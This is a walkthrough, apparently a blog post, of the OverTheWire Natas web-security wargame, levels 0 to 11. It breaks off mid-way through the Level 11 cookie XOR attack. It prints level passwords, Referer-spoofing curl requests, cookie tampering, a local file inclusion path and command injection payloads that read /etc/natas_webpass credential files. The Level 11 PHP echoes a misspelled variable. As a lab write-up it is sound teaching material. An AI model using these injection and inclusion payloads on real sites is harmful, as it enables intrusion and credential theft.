---
title: "Over The Wire - Natas Walkthrough"
date: 2019-03-24T15:59:46Z
---

# Level 0

Using right-click anywhere on the page should show a menu from where you can select "*View Page Source*", clicking it will show you the page source code. From where you'll see:

```html
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
</div>
```

We got our password! 
Open http://natas1.natas.labs.overthewire.org/ and head on to the next level!

# Level 1

So, in this level they disabled right-clicking (or at least they tried, in Firefox you're able to right-click just fine).
You have several ways to go around this!

For Firefox (besides right clicking) and Chrome you can:
    - Write `view-source:` before the URL and you'll be able to see the source, just like before
    - Use the shortcut for the Inspector - `Ctrl + Shift + I`

Afterwards you'll be able to see the following on the page source code

```html
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
</div>
```

And just like that we have the password for our Level 2!

# Level 2

Opening up Level 2, the webpage greets us with *There is nothing on this page*, however, since we are curious people we go to the page source code once more!

```html
<h1>natas2</h1>
<div id="content">
    There is nothing on this page
    <img src="files/pixel.png">
</div>
```

Hmmm, that image is looking suspicious! In fact, if we actually try to download it, it's just one pixel. Useless...

But the `pixel.png` is linked with a relative path, inside a directory! Maybe it's accessible! We paste `files/` in the end of our link and bingo!

![level2](/otw_natas/level2.png)

Given that we already checked the `pixel.png` we can head on to the `users.txt`, click it!

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
 
There is the password! We can now go on to Level 3!

# Level 3

On Level 3 we are greeted once more with *There is nothing on this page* and once more we head to the source code!

```html
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```

A clue! If Google can't find the password it must mean it was disallowed on the [`robots.txt`](http://www.robotstxt.org/robotstxt.html)! 
Lets head on to it and see for ourselves, paste `/robots.txt` in the URL again.

```
User-agent: *
Disallow: /s3cr3t/
```

Found it! Now let's see what's inside, going to `http://natas3.natas.labs.overthewire.org/s3cr3t/` we find:

![level3](/otw_natas/level3.png)

And again, we click it to find:

```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

# Level 4

This time we are greeted with a clue!

> Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Which implies that authorized users must come from `http://natas5.natas.labs.overthewire.org/`, in another words we need to be redirected from Level 5.

Trying to log into Level 5 won't work, we can however pretend we came from there!
Looking at the Wikipedia page for [HTTP headers](https://en.wikipedia.org/wiki/List_of_HTTP_header_fields) we will find the Referer, which has its own [page](https://en.wikipedia.org/wiki/HTTP_referer)!

And the following description:

> This is the address of the previous web page from which a link to the currently requested page was followed. (The word “referrer” has been misspelled in the RFC as well as in most implementations to the point that it has become standard usage and is considered correct terminology)

Which in other words means we can use it to pretend we came from anywhere!

For this we could use Python with `requests`, however using `curl` is much more straightforward for this.

The command we will use is:

```
curl -X GET \
    --header "Referer:http://natas5.natas.labs.overthewire.org/" \
    -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \
    http://natas4.natas.labs.overthewire.org/index.php
```

We can break it down to three flags:

  - `-X` allows us to specify what kind of HTTP request we wish to make, we use `GET` since it's 
    the *standard* way - you can read more about them [here](https://www.w3schools.com/tags/ref_httpmethods.asp)
  - `--header` gives us the ability to write our own header, using it to define the `Referer` -
    this could be replaced with `-e http://natas5.natas.labs.overthewire.org/` which yields exactly the same request
  - `u` allows us to use [Basic Access Authentication](https://en.wikipedia.org/wiki/Basic_access_authentication) to access Level 4

`curl` then proceeds to download the web page and print it to `stdout`.

```html
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
```

Perfect!

# Level 5

Hitting Level 5 we get `Access disallowed. You are not logged in`! Bummer!

Once more we hit the Inspect, however this time we have nothing, no clues...

```html
<body>
    <h1>natas5</h1>
    <div id="content">
        Access disallowed. You are not logged in
    </div>
</body>
```

Introducing the Network and the Storage tabs! Hopefully you're not blind (if you are, how are you reading this?), or your browser didn't hid it from you (if it did, enable it), otherwise you should have already noticed them (those last two)!

![level5](/otw_natas/level5.png)

In the Network tab we can see a trace of the requests made from the moment you load the page.

![level5_1](/otw_natas/level5_1.png)

Here, we're only interested in the `document` (the first one), upon close inspection we can notice both `Request` and `Response` headers refer a cookie - `loggedin=0`

Well, clearly `0` is not working out so we need to change it! Heading over to the Storage tab we can change stored cookies and so we change our cookie to `1`.

Press F5 and `Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`, we got it!

# Level 6

Now things get a little different. We are no longer only dealing with the webpage itself and we are given a `.php` snippet (the source)

> Disclaimer - I hate PHP

Before we even try and use the fancy interface, we should look at the source code.

```php
<?
include "includes/secret.inc";
    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
            print "Access granted. The password for natas7 is <censored>";
        } else {
            print "Wrong secret";
        }
    }
?>
```

Hmm, so the file seems to be importing another file `secret.inc` and then use `$secret` to check if our `secret` field in the `POST` request match.

As usual, we dive head first into the `includes/secret.inc` pasting it into the URL.
Arriving there we see, _**nothing**_, well for a second I almost fell for it, never forget to inspect the page!

```html
<!--? $secret = "FOEIUWGHFEEUHOFUOIU"; ?-->
<html>
    <head></head>
    <body></body>
</html>
```

Aha! The first line has the code! Now we just need to go back, paste it into the text field and submit!

Voilá! We are greeted with:

`Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

# Level 7

The page in Level 7 is dead simple. Two links, one for `Home` and another for `About`.

Clicking them doesn't do much (yet) and reading the source we find:

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the front page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

However how can we access it? There's no input... 
However when we click one of the links we see the page URL change.

  - For the `Home` page we see `.../index.php?page=home` 
  - And for the `About` page `.../index.php?page=about` 

Maybe we could try something with it, since the server, when looking for the pages probably looks in the filesystem using the `page` variable value.

We know that all passwords are located in `/etc/natas_webpass/natasX` so we go ahead and paste it on to our query string making it `page=/etc/natas_webpass/natas8` and we get our password.

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

This is called a File Inclusion Vulnerability! You can read more about it [here](https://en.wikipedia.org/wiki/File_inclusion_vulnerability) and [here](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion).

Remember to always validate your inputs!

# Level 8

Again, more PHP. Let's make quick!

We go straight for the source code, because what is better than the source?
Reading the source code we see the following snippet:

```php
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted. The password for natas9 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```

We have one function that encodes a secret to [Base64](https://en.wikipedia.org/wiki/Base64),
reverses the resulting string and converts the string to [hexadecimal](https://en.wikipedia.org/wiki/Hexadecimal) 
(yes, [`bin2hex`](https://www.php.net/manual/en/function.bin2hex.php) is not binary to hexadecimal,
always search before assuming anything - like I did the first time).

After the function we have the actual script part, it checks if the `submit` variable exists in the request,
if it exists it encodes the `secret` variable using `encodeSecret` and compares with the `$encodedSecret` variable,
if they match we get the password!

Since all operations done by `encodeSecret` are reversible we can start getting to work!

  - First we will take `$encodedSecret` and convert it from hexadecimal to a string again
  - Then we reverse the string order
  - Finally we decode the Base64 result

The resulting script more or less like this:

```php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($secret) {
  return base64_decode(strrev(hex2bin($secret)));
}
echo decodeSecret($encodedSecret);
?>
```

Running this yields our secret which we now need to `POST` to the server. 
We can simply send it by submitting it on the actual page, doing that we get the Level 9 password!

```html
<div id="content">

Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
<form method="post">
Input secret: <input name="secret"><br>
<input type="submit" name="submit">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

# Level 9

Level 9 is tons of fun and we start to get a taste of how dangerous some vulnerabilities can be!

We are greeted with an input field and more source code, again, straight to the source.
Where we find:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

We can see, straight up `grep -i $key dictionary.txt` and `$key` is just taken from the request, no sanitization!
Which means we can write anything there and it will execute with the `grep` command.

## Example

`http://natas9.natas.labs.overthewire.org/?needle=test&submit=Search`

> Will run the script with `$key=test`, resulting in the execution of `grep -i test dictionary.txt`.

`http://natas9.natas.labs.overthewire.org/?needle=.*&submit=Search`

> Yields `grep -i .* dictionary.txt`.


There are several ways we can solve this level, however we will opt through the most straightforward way, given this yells [Command Injection](https://www.owasp.org/index.php/Command_Injection);
Given we can write anything into the string what we want to do is to the escape from the `grep` command and execute interesting stuff.

We can do that by writing:

```bash
! dictionary.txt ; cat /etc/natas_webpass/natas10; grep -i !
```

Which results in the execution of the following command:

```bash
grep -i ! dictionary.txt ; cat /etc/natas_webpass/natas10; grep -i ! dictionary.txt
```

Breaking it down we can notice the same command in the beggining and the end.
The usage of `!` is just so we don't get any matches from either `grep`'s and the `dictionary.txt` that we add in the input is just to avoid `grep` crashing.
The `;` allows us to write another command to execute after the first one finished, 
providing the ability to add the `cat /etc/natas_webpass/natas10` which will print the file.

```html
<div id="content">
<form>
Find words containing: <input name="needle"><input type="submit" name="submit" value="Search"><br><br>
</form>


Output:
<pre>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Could this be done in a shorter way? Yes, however we will need it further down the road.

# Level 10

Level 10 is the same gist, however, there is some user input "sanitization".

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

The characters `;`, `|` and `&` are now disabled, but that won't stop us.
Remember how I said that Level 9 could be done in a shorter way?

Well, it turns out that `grep` can apply one regex to more than one file and that is what we are going to do.
Right now we still have this:

```bash
grep -i $key dictionary.txt
```

And the input is filtered for some characters, however they didn't block `"`, `*` or `.`,
this way we can define `$key` as being a the regex and another file!

Since now we want to match anything in order for the password to show up we will use `.*` and as a file,
our dear and beloved `/etc/natas_webpass/natas11` and our input will look like

```bash
.* /etc/natas_webpass/natas11
```

If for some reason your output is not sorted by file and the one of the first files isn't the password, use `Ctrl + F`.
Otherwise you probably got this:

```html
<div id="content">

For security reasons, we now filter on certain characters<br><br>
<form _lpchecked="1">
Find words containing: <input name="needle"><input type="submit" name="submit" value="Search"><br><br>
</form>


Output:
<pre>.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0
.htpasswd:natas10:$1$mRklUuvs$D4FovAtQ6y2mb5vXLAy.P/
.htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
...
```

And there you have it!

# Level 11

This one is a little harder. It's okay to ask for help!
Especially with the nightmare that is PHP...

For this one I recommend using either the PHP interpreter on your shell or just a online REPL. 
I used [this](http://phpepl.herokuapp.com/).

The page greets you with a background color "setter". It works, but for our purposes it's useless.
As usual we will go through the source code and try to pretend we know how PHP works!

This time the code is a little longer:

```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```

Well, before we begin the page already told us that the cookies are XOR encrypted so we might as well read up on [that](https://en.wikipedia.org/wiki/XOR_cipher).

The TL:DR is, if you want to encrypt `data` with a certain `key`, you XOR all their bits, if the key is too short, cycle it!
Afterwards you get `encrypted_data` and to decrypt it you need to XOR it with `key`.

Using our logical skills we can deduct that:

```
data XOR key = encrypted_data
encrypted_data XOR key = data

data XOR encrypted_data = key
```

And it is in fact true. 
This means that even before analysing our code we can already construct a plan.

  - Get the original data
  - Get the encrypted data from the cookie
  - XOR them to get the key
  - ???
  - We got the password

So first things first, lets take a look at the source, we already know what `xor_encrypt` does, so lets skip it.
Before looking at the functions, we should see what the script will actually run!
This starts with `$data = loadData($defaultdata);`, then if the `bgcolor` value exists, change the background to it and finally a call to `saveData($data);`.

We are now ready to dive into it. Starting with `loadData($defaultdata)` and 
looking at `$defaultdata` for now it's just this weird array that is also a dictionary or whatever you kids call it these days.

Entering the function we can see it defines two variables, a global one `$COOKIE`, which will be the cookie being used, 
and a local one `$mydata`, nothing more than a copy of `$def` (which is our `$defaultdata`).

As we are able to see in `if(array_key_exists("data", $_COOKIE))`, it checks if the cookie exists before actually doing something, 
no big deal, however it is useful to identify what our cookie will look like!

Afterwards, it defines a new variable:

```php
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
```

This is more interesting, we can see they are trying to hide it from plainsight! Or in this case, trying to decode it.
It first uses `base64_decode` to decode the `Base64` string, then the `xor_encrypt` to decrypt the content and finally a `json_decode` and all this on the cookie!

The code afterwards is just input validation and some logic for the color picker so we won't look at it (it's PHP anyway, don't feel bad).

Before going back to the code, we need to see the cookie!
Just like in the previous levels you should go to the Storage, etc, etc.

When in there you'll see the cookie `data`, containing the value `ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D` (the `%3D` can be removed).

Now that we have our cookie, back to our code, we need to reverse the process, time to take matters into our hands!

We know that the cookie we have is the result of all that processing applied to the `$defaultdata`.
This way, we can XOR the original with the encrypted data to get the key!

We'll do it like this:

```php
<?php
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$decoded_b64 = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw");
$decrypted_key = xor_encrypt($decoded_b64);
echo $decripted_key;
?>
```

Note that we modified the key to be the JSON encoded value array!
Running this will print `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`, notice the pattern? 
`qw8J` is the key! And now we can use it to encrypt the 